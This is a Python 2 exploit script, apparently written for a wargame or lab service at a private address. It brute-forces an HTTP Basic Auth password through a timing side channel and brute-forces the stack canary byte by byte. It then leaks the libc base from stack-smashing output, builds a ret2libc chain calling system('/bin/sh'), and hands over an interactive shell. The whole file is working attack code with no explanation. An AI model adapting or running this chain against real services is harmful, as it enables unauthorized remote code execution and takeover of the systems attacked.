#!/usr/bin/python
import socket
import base64
import struct
import time
import telnetlib

RHOST = "192.168.1.11"
RPORT = 20004

ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

def connect(payload, timeout = 0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    if timeout != 0:
        s.settimeout(timeout)

    s.send("GET / HTTP/1.0\n")
    s.send("Authorization: Basic " + payload + "\n")
    return s

def chain(base):
    payload = struct.pack("<I", base + 248608) # system address offset
    payload += struct.pack("<I", base + 207328) # exit address offset
    payload += struct.pack("<I", base + 1280218) # /bin/sh address offset
    return payload 

def bpassword(length = 16, tries = 4):
    password = ""
    
    for i in range(length):
        lalnum = []
        for j in range(len(ALNUM)):
            payload = "+"*(len(password)) + ALNUM[j]
            payload += "+"*(length - len(payload))
            
            ltries = []
            for k in range(tries):
                start = time.time() # start time
                s = connect(base64.b64encode(payload)) 
                s.recv(1024)
                # compute time delta
                ltries.append(time.time() - start)

            lalnum.append(min(ltries))

        malnum = lalnum.index(min(lalnum))
        password += ALNUM[malnum]
        print "[+] Password:", password

    print "[!] Found password:", password
    return password

def bcanary(password):
    padding = password
    padding += "A"*(2048 - len(padding))
    
    canary = ""
    for i in range(4 - len(canary)):
        for j in (range(0xff)):
            b = struct.pack("B", j)
            payload = base64.b64encode(padding + canary + b)
            try:
                s = connect(payload, timeout = 1)
                s.recv(1024)
            except socket.error as error:
                canary += b
                print "[+] canary[" + str(i) + "]:", "\\x" + b.encode("hex")
                break 
   
    print "[!] Found canary: 0x{:x}".format(struct.unpack("I", canary)[0])
    return canary

def main(password, canary):
    padding = password
    padding += "A"*(2048 - len(padding))
    
    print "[*] Leaking libc base address through stack smashing..."
    libc = 0
    while True:
        s = connect(base64.b64encode(padding + "AAAA"))
        s.recv(1024) # ignore 
        info = s.recv(1024).split("\n")
        try:
            x = int(info[2][len(info[2]) - 11:-1], 16)
            y = int(info[2][len(info[2]) - 20:-13], 16)
            libc = x - y
            if libc != 0:
                print "[!] Found libc base address at 0x{:x}".format(libc)
                break
        except:
            False # just do nothing
            
    print "[*] Crafting ret2libc using libc base address..." 
    payload = canary
    payload += "B"*28
    payload += chain(libc)
    s = connect(base64.b64encode(padding + payload))
    
    print "[+] Switching to interactive mode..."
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

if __name__ == "__main__":
    print "[*] Cracking the password..."
    password = bpassword() # "bohL0n6qy633yPu4"
    print "[*] Cracking the canary/cookie..."
    canary = bcanary(password) # struct.pack("<I", 0x9a095800)
    main(password, canary)
